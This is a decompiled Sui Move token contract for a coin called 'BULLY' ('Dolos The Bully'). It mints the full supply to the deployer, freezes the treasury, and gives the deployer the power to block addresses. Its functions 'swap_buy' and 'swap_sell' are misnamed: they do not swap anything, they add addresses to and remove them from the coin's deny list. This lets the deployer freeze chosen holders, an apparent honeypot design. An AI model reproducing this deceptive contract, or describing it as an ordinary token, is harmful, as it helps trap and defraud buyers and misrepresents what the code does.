module 0x35398276269f8821578f9e4a9c387fcb07b75045267fa10ca193c8ab1c10c75::bully {
    struct BULLY has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BULLY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BULLY>(arg0, 9, b"BULLY", b"Dolos The Bully", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmNMsVRQz2dWkC34rUJ9exBtzkCKUa1frfHM5YxizJR4GV"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BULLY>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BULLY>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BULLY>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BULLY>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BULLY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BULLY>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BULLY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BULLY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

